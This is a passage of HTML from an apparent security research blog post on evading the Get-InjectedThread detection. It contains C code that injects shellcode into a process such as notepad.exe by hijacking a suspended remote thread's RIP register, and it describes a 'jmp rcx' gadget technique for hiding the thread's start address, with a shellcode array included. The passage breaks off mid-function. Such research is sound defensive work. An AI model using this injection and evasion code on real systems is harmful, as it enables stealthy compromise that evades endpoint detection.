+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC61" class="blob-code blob-code-inner js-file-line">	<span class="pl-s1">threadHandle</span> <span class="pl-c1">=</span> <span class="pl-en">CreateRemoteThread</span>(<span class="pl-s1">processHandle</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>, (<span class="pl-smi">LPTHREAD_START_ROUTINE</span>)<span class="pl-s1">_loadLibrary</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">CREATE_SUSPENDED</span>, <span class="pl-c1">NULL</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L62" class="blob-num js-line-number js-blob-rnum" data-line-number="62"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC62" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">threadHandle</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L63" class="blob-num js-line-number js-blob-rnum" data-line-number="63"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC63" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, <span class="pl-en">GetLastError</span>());</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L64" class="blob-num js-line-number js-blob-rnum" data-line-number="64"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC64" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">2</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L65" class="blob-num js-line-number js-blob-rnum" data-line-number="65"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC65" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L66" class="blob-num js-line-number js-blob-rnum" data-line-number="66"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC66" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L67" class="blob-num js-line-number js-blob-rnum" data-line-number="67"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC67" class="blob-code blob-code-inner js-file-line">	<span class="pl-c">// Get the current registers set for our thread</span></td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L68" class="blob-num js-line-number js-blob-rnum" data-line-number="68"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC68" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">CONTEXT</span> <span class="pl-s1">ctx</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L69" class="blob-num js-line-number js-blob-rnum" data-line-number="69"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC69" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">ZeroMemory</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">ctx</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">CONTEXT</span>));</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L70" class="blob-num js-line-number js-blob-rnum" data-line-number="70"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC70" class="blob-code blob-code-inner js-file-line">	<span class="pl-s1">ctx</span>.<span class="pl-c1">ContextFlags</span> <span class="pl-c1">=</span> <span class="pl-c1">CONTEXT_CONTROL</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L71" class="blob-num js-line-number js-blob-rnum" data-line-number="71"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC71" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">GetThreadContext</span>(<span class="pl-s1">threadHandle</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ctx</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L72" class="blob-num js-line-number js-blob-rnum" data-line-number="72"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC72" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L73" class="blob-num js-line-number js-blob-rnum" data-line-number="73"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC73" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] RIP register set to %p\n"</span>, <span class="pl-s1">ctx</span>.<span class="pl-c1">Rip</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L74" class="blob-num js-line-number js-blob-rnum" data-line-number="74"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC74" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Updating RIP to point to our shellcode\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L75" class="blob-num js-line-number js-blob-rnum" data-line-number="75"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC75" class="blob-code blob-code-inner js-file-line">	<span class="pl-s1">ctx</span>.<span class="pl-c1">Rip</span> <span class="pl-c1">=</span> (<span class="pl-smi">DWORD64</span>)<span class="pl-s1">alloc</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L76" class="blob-num js-line-number js-blob-rnum" data-line-number="76"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC76" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L77" class="blob-num js-line-number js-blob-rnum" data-line-number="77"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC77" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Resuming thread execution at our shellcode address\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L78" class="blob-num js-line-number js-blob-rnum" data-line-number="78"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC78" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">SetThreadContext</span>(<span class="pl-s1">threadHandle</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ctx</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L79" class="blob-num js-line-number js-blob-rnum" data-line-number="79"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC79" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">ResumeThread</span>(<span class="pl-s1">threadHandle</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L80" class="blob-num js-line-number js-blob-rnum" data-line-number="80"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC80" class="blob-code blob-code-inner js-file-line">}</td>
+        </tr>
+  </tbody></table>
+</div>
+
+
+    </div>
+
+  </div>
+
+</div>
+
+      </div>
+      <div class="gist-meta">
+        <a href="https://gist.github.com/xpn/c043b84668334b6fc1131dd3b59ed97f/raw/79310705658742a94cb2c58f01fe443c289ad44d/get_injectedthread-example_setthreadcontext.c" style="float:right" class="Link--inTextBlock">view raw</a>
+        <a href="https://gist.github.com/xpn/c043b84668334b6fc1131dd3b59ed97f#file-get_injectedthread-example_setthreadcontext-c" class="Link--inTextBlock">
+          get_injectedthread-example_setthreadcontext.c
+        </a>
+        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
+      </div>
+    </div>
+</div>
+
+
+
+<p>Running our example, we see that we have our second method of executing shellcode, injecting our thread into notepad.exe:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/bypass2.png" alt="bypass2"></p>
+<h2 id="Return-Oriented…-urm-threading"><a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/#Return-Oriented%E2%80%A6-urm-threading" class="headerlink" title="Return Oriented… urm, threading"></a>Return Oriented… urm, threading</h2><p>OK, so this one is a bit out of left field… In this example, we will leverage the instructions of an existing <code>MEM_IMAGE</code> binary to pass execution to our shellcode (think ROP), so we:</p>
+<ol>
+<li>Allocate memory in the target process to hold our shellcode.</li>
+<li>Copy our shellcode into the allocated memory.</li>
+<li>Hunt for a gadget in the victim process which will trampoline our thread execution into the shellcode.</li>
+<li>Start our thread with our <code>ThreadProc</code> pointing to the gadget.</li>
+</ol>
+<p>We know that we will be starting execution of our thread using the <code>CreateRemoteThread</code> call, which takes the address of our <code>ThreadProc</code> to execute. We also know that we can pass an optional argument to our <code>ThreadProc</code>.</p>
+<p>On x64 processes, the argument will be passed in the <code>rcx</code> register, so how about we hunt for a gadget of:</p>
+<pre><code class="hljs nginx"><span class="hljs-attribute">jmp</span> rcx
+</code></pre>
+<p>This way, we can set our <code>ThreadProc</code> address to the <code>jmp rcx</code> gadget, and pass our shellcode address as the argument. Again this meets the requirement of ensuring that our thread’s base address being within a <code>MEM_IMAGE</code> section of memory, so should help avoid detection.</p>
+<p>Below is an example of how to achieve this:</p>
+
+<link rel="stylesheet" href="https://github.githubassets.com/assets/gist-embed-8703547f549b05ef.css"><div id="gist88862217" class="gist">
+    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
+      <div class="gist-data">
+        
+<div class="js-gist-file-update-container js-task-list-container">
+      <div id="file-get_injectedthread-example_rop-c" class="file my-2">
+    
+    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="get_injectedthread-example_rop.c content, created by xpn on 10:26PM on April 07, 2018.">
+
+        
+<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">
+
+  
+  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
+  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+    <span>
+      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
+      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
+    </span>
+
+
+  <div data-view-component="true" class="flash-action">        <a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/" data-view-component="true" class="btn-sm btn">    Show hidden characters
+</a>
+</div>
+</div>
+
+  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
+    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+</span>
+
+  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="get_injectedthread-example_rop.c">
+        <tbody><tr>
+          <td id="file-get_injectedthread-example_rop-c-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">unsigned <span class="pl-smi">char</span></span> <span class="pl-s1">shellcode</span>[<span class="pl-c1">256</span>] <span class="pl-c1">=</span> {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC2" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0x90</span>, <span class="pl-c1">0x90</span>, <span class="pl-c1">0x90</span>, <span class="pl-c1">0x90</span>, <span class="pl-c1">0x55</span>, <span class="pl-c1">0x48</span>, <span class="pl-c1">0x89</span>, <span class="pl-c1">0xe5</span>, <span class="pl-c1">0x48</span>, <span class="pl-c1">0x31</span>, <span class="pl-c1">0xc9</span>, <span class="pl-c1">0x48</span>, <span class="pl-c1">0x8d</span>, <span class="pl-c1">0x15</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC3" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0x14</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0x49</span>, <span class="pl-c1">0x89</span>, <span class="pl-c1">0xd0</span>, <span class="pl-c1">0x4d</span>, <span class="pl-c1">0x31</span>, <span class="pl-c1">0xc9</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC4" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0x48</span>, <span class="pl-c1">0xb8</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC5" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xd0</span>, <span class="pl-c1">0xeb</span>, <span class="pl-c1">0xfe</span>, <span class="pl-c1">0x54</span>, <span class="pl-c1">0x68</span>, <span class="pl-c1">0x72</span>, <span class="pl-c1">0x65</span>, <span class="pl-c1">0x61</span>, <span class="pl-c1">0x64</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC6" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0x20</span>, <span class="pl-c1">0x54</span>, <span class="pl-c1">0x65</span>, <span class="pl-c1">0x73</span>, <span class="pl-c1">0x74</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC7" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC8" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC9" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC10" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC11" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC12" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC13" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC14" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC15" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC16" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC17" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC18" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC19" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC20" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC21" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC22" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC23" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC24" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC25" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC26" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC27" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span></td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC28" class="blob-code blob-code-inner js-file-line">};</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC29" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC30" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">int</span> <span class="pl-en">example_rop</span>(<span class="pl-smi">int</span> <span class="pl-s1">pid</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC31" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">char</span> <span class="pl-s1">currentDir</span>[<span class="pl-c1">MAX_PATH</span>], <span class="pl-s1">buffer</span>[<span class="pl-c1">4096</span>];</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC32" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">SIZE_T</span> <span class="pl-s1">bytesWritten</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>, <span class="pl-s1">bytesRead</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L33" class="blob-num js-line-number js-blob-rnum" data-line-number="33"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC33" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">HANDLE</span> <span class="pl-s1">threadHandle</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L34" class="blob-num js-line-number js-blob-rnum" data-line-number="34"></td>
